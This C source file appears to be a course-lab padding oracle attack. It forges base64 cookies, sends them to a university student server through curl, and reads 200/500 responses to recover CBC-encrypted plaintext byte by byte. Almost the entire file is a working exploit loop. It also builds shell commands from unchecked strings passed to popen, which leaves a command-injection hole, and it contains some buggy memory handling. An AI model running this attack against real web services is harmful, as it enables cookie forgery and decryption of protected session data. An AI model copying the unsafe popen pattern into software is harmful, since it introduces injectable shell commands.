#include<stdlib.h>
#include<stdio.h>
#include<time.h>
#include <stdbool.h>
#include<string.h>
//#include<curl.h>
#define COOKIE_LEN 100
#define cons_W 	256
#define cons_b 	16
#define cons_N 3
#define cons_url "http://ugster19.student.cs.uwaterloo.ca:4555"
#define Default_cookie "8hIOODzClpAhMw/0dAalk+YrwZqmZPmuCyOmRpzyfH+fnJ0dKBtOL+NaHufa1MQw1XE8KtKXp2ARNcIvUVFruw=="
char  IV[] = "f2120e383cc2969021330ff47406a593";

//struct for sent return
struct reArray{
	char* r;
	int pos ;
};
//curl to get staus; if 200 return 1; if 500 return 0;
bool sentToWeb(char* myCookie){
	char* cmd = (char*)malloc(1000);
	char response[5000];
	char wrong_c[] = "HTTP/1.1 500 Internal Server Error";
	char right_c[] = "HTTP/1.1 200 OK";
	sprintf(cmd, "curl -s -D - -b user=\'%s\' %s", myCookie, cons_url);
	FILE *fp;
	fp = popen(cmd, "r");
	if(fp == NULL) {
		printf("sentToWeb pipe open failed! \n");
		return 0;
	}
	fgets(response, 5000, fp);
	//printf("This is response %s \n",response);
	bool isOk = true;
	int i=0;
	for(i=0;i<15;i++){
		if(response[i] != right_c[i]){
			return 0;
		}
	}
	printf("Fake cookie works: %s \n", myCookie);
	return 1;
}

// bigOfunc if pass padding check return 1; else return 0
bool bigOFunc(char * cmbStr){	//cmbStr is a itoa str
	//first combine it with IV; IV should be a itoa str
	char* finalCmbStr = (char*)malloc(strlen(cmbStr) + strlen(IV));
	strcpy(finalCmbStr, IV);
	strcat(finalCmbStr, cmbStr);
	char encodedFinalStr[1000];
	printf("finalCmbStr's length is: %d \n", (int)(strlen(finalCmbStr)));
	//base64 encode
	char cmd[1000];
	sprintf(cmd, "echo   \"%s\"  | xxd -r -p |  base64", finalCmbStr );
	printf("cmd: %s\n", cmd);
	FILE *fp;
	fp = popen(cmd, "r");
	while(fgets(encodedFinalStr, 1000, fp)!=NULL){
		printf("EncodedFinalStr: %s \n", encodedFinalStr);
	}
	// now encodedFinalStr is base64 ed 
	// final agree pos
	int pos = 1;
	if(sentToWeb(encodedFinalStr)){
		return 1;
	}
	return 0;
}

//decrypt a single word, return plaintext
struct reArray decryption(char* C){
	// C is not itoa base
	srand(time(NULL));
	char r[cons_b+1];
	r[cons_b] = '\0';
	int _i = 0, i=0;
	for(i=0;i<cons_b;i++){
		r[i] = (char)(rand()%256);
	}
	char _bug = (char)(rand()%256);
	char hexBaseStr[65];
	hexBaseStr[64] = '\0';
	r[cons_b-1] = (char)(_bug ^ (_i));
	int i_1=0;
	// first r then C
	for(i_1=0;i_1<16;i_1++){
		sprintf(hexBaseStr+i_1*2, "%02x", (unsigned char)(r[i_1]));
	}
	printf("HexStr is: %s length is: %d \n", hexBaseStr, strlen(hexBaseStr));
	int i_2 = 0;
	for(i_2=0;i_2<16;i_2++){
		sprintf(hexBaseStr+32+i_2*2, "%02x", (unsigned char)(C[i_2]));
	}
	//bigOFunc(cmbStr);
	printf("Final R is: %s length is: %d \n", r, strlen(r));
	printf("HexStr is: %s length is: %d \n", hexBaseStr, strlen(hexBaseStr));
	while(!bigOFunc(hexBaseStr)){
		_i++;
		//if(_i >256) return NULL;
		r[cons_b-1] = (char)(_bug ^ (_i));
		printf("r lenght: is %d \n",(int)strlen(r));
		printf("C lenght: is %d\n",(int)strlen(C));
		printf("HexStr lenght: is %d\n",(int)strlen(hexBaseStr));
		// first r then C
		for(i_1=0;i_1<16;i_1++){
			sprintf(hexBaseStr+i_1*2, "%02x", (unsigned char)(r[i_1]));
		}
		for(i_1=0;i_1<16;i_1++){
			sprintf(hexBaseStr+32+i_1*2, "%02x", (unsigned char)(C[i_1]));
		}
	}
	struct reArray re;
	// if return 200, try to find the agree pos
	// make a copy of r[]
	char* sd_r = (char*)malloc(cons_b+1); // used to return 
	for(i=0;i<cons_b+1;i++){
		sd_r[i] = r[i];
	}
	//check odd cases
	for( i= cons_b; i>=2;i--){
		r[cons_b-i+1] = sd_r[cons_b-i+1] ^ 1;
		for(i_1=0;i_1<16;i_1++){
			sprintf(hexBaseStr+i_1*2, "%02x", (unsigned char)(r[i_1]));
		}
		if(!bigOFunc(hexBaseStr)){
			//pos is 1
			 re.r = sd_r;
			re.pos = i;
			return re;
		}
	}
	re.r = sd_r;
	re.pos = 1;
	return re;
}


int main(int argc, char** argv){
	if(argc !=2){
		printf("Wrong Input Format!");
		return -1;
	}
	FILE *fp;
	int block_count = 0;
	char *cmd= (char *)malloc(1000);	
	char  de_cookie_base64[10][100];
	// prepare cmd para
	sprintf(cmd, "echo \"%s\" | base64 -d | od -A n -t x1 ", argv[1]);
	fp = popen(cmd, "r");
	// test pipe open or not
	if(fp == NULL){
		printf("%s", "Failed to run cmd\n");
		exit(1);
	}
	// read base64 decoded data from pipe
	while(fgets(de_cookie_base64[block_count],COOKIE_LEN, fp) != NULL){
		//printf("de_cookie_base64[%d] is: %s\n", block_count, de_cookie_base64[block_count]);
		block_count++;
	}
	printf("cmd is: %s \n",cmd);	
	decryption("\xd5\x71\x3c\x2a\xd2\x97\xa7\x60\x11\x35\xc2\x2f\x51\x51\x6b\xbb");

	return 0;
}



